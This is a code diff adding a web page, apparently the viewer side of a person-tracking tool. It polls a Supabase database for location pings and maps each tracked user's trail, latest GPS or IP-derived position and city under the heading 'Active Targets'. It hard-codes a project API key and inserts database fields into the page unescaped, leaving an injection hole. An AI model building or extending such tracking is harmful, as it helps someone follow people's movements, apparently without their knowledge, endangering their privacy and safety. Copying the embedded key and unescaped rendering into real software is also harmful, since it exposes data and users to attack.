@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Live Tracking Dashboard</title>
+    <!-- Leaflet Map CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; }
+        #map { height: 100vh; width: 100%; }
+        
+        .sidebar { 
+            position: absolute; top: 15px; right: 15px; 
+            background: rgba(15, 23, 42, 0.85); padding: 20px; 
+            border-radius: 12px; z-index: 1000; width: 320px; 
+            max-height: 90vh; overflow-y: auto; 
+            border: 1px solid rgba(255,255,255,0.1); 
+            backdrop-filter: blur(10px); 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        
+        h3 { margin-top: 0; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; color: #f8fafc; font-weight: 600;}
+        
+        .user-card { 
+            margin-bottom: 15px; padding: 12px; 
+            background: rgba(255,255,255,0.05); 
+            border-radius: 8px; font-size: 0.9em;
+            transition: transform 0.2s;
+        }
+        .user-card:hover { transform: translateX(-5px); }
+        .user-card strong { color: #94a3b8; font-weight: normal; }
+        .user-card .val { color: #fff; font-weight: 600; }
+        
+        .method-badge { font-size: 0.75em; padding: 3px 8px; border-radius: 12px; font-weight: bold; margin-left: 5px;}
+        .method-gps { background: rgba(16, 185, 129, 0.2); color: #34d399; }
+        .method-ip { background: rgba(245, 158, 11, 0.2); color: #fbbf24; }
+        
+        .city { display: block; margin-top: 8px; color: #cbd5e1; font-size: 0.85em; }
+        
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div id="map"></div>
+    <div class="sidebar">
+        <h3>📍 Active Targets</h3>
+        <div id="target-list">Waiting for signals...</div>
+    </div>
+
+    <!-- Leaflet Map JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        const SUPABASE_URL = "https://oyherhkvrsxoalcczdam.supabase.co";
+        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im95aGVyaGt2cnN4b2FsY2N6ZGFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE4Njg2ODgsImV4cCI6MjA5NzQ0NDY4OH0.O9_k-cbNJ7dfm0mp2nyRhce2cEDPCHiaK9_ZC23oLzg";
+
+        // Initialize Map with a dark theme
+        const map = L.map('map').setView([20, 0], 2);
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            attribution: '&copy; OpenStreetMap contributors &copy; CARTO'
+        }).addTo(map);
+
+        const markers = {};
+        const polylines = {};
+        const colors = ['#3b82f6', '#ef4444', '#10b981', '#f59e0b', '#8b5cf6', '#ec4899'];
+
+        let isFirstLoad = true;
+
+        async function fetchLocations() {
+            try {
+                // Fetch the 1000 most recent pings, ordered ascending so we can draw lines chronologically
+                const res = await fetch(`${SUPABASE_URL}/rest/v1/locations?select=*&order=id.asc&limit=1000`, {
+                    headers: {
+                        "apikey": SUPABASE_KEY,
+                        "Authorization": `Bearer ${SUPABASE_KEY}`
+                    }
+                });
+                
+                if(!res.ok) {
+                    document.getElementById('target-list').innerHTML = `<span style="color:#ef4444">Database error. Did you enable SELECT policy?</span>`;
+                    return;
+                }
+                
+                const data = await res.json();
+                updateDashboard(data);
+            } catch (err) {
+                console.error("Fetch error:", err);
+            }
+        }
+
+        function updateDashboard(data) {
+            const users = {};
+            
+            // Group all points by the unique user_id
+            data.forEach(row => {
+                if (!row.latitude || !row.longitude) return;
+                const uid = row.user_id || 'unknown';
+                if (!users[uid]) users[uid] = [];
+                users[uid].push(row);
+            });
+
+            const listEl = document.getElementById('target-list');
+            if (Object.keys(users).length === 0) {
+                listEl.innerHTML = 'Waiting for signals...';
+                return;
+            } else {
+                listEl.innerHTML = '';
+            }
+
+            let colorIndex = 0;
+
+            for (const uid in users) {
+                const path = users[uid];
+                const latest = path[path.length - 1]; // The most recent location ping
+                const color = colors[colorIndex % colors.length];
+                colorIndex++;
+
+                // Draw the line (trail)
+                const latlngs = path.map(p => [p.latitude, p.longitude]);
+                if (polylines[uid]) {
+                    polylines[uid].setLatLngs(latlngs);
+                } else {
+                    polylines[uid] = L.polyline(latlngs, {color: color, weight: 4, opacity: 0.6}).addTo(map);
+                }
+
+                // Draw the glowing marker for their current position
+                if (markers[uid]) {
+                    markers[uid].setLatLng([latest.latitude, latest.longitude]);
+                } else {
+                    markers[uid] = L.circleMarker([latest.latitude, latest.longitude], {
+                        radius: 6, fillColor: color, color: '#fff', weight: 2, fillOpacity: 1
+                    }).addTo(map);
+                }
+
+                // Only center the map around the user automatically on the very first load
+                if (isFirstLoad && Object.keys(users).length === 1) {
+                    map.setView([latest.latitude, latest.longitude], 15);
+                }
+
+                // Add card to the sidebar
+                const methodClass = latest.method?.includes('GPS') ? 'method-gps' : 'method-ip';
+                const timeString = latest.local_timestamp ? new Date(latest.local_timestamp).toLocaleTimeString() : new Date(latest.created_at).toLocaleTimeString();
+                
+                listEl.innerHTML += `
+                    <div class="user-card" style="border-left: 4px solid ${color}">
+                        <strong>ID:</strong> <span class="val">${uid.split('_')[1] || uid}</span><br>
+                        <strong>Time:</strong> <span class="val">${timeString}</span>
+                        <span class="method-badge ${methodClass}">${latest.method || 'UNKNOWN'}</span><br>
+                        <span class="city">📍 ${latest.ip_city || 'Location area unknown'}</span>
+                    </div>
+                `;
+            }
+            
+            isFirstLoad = false;
+        }
+
+        // Fetch immediately, then ping database every 3 seconds
+        fetchLocations();
+        setInterval(fetchLocations, 3000);
+    </script>
+</body>
+</html>
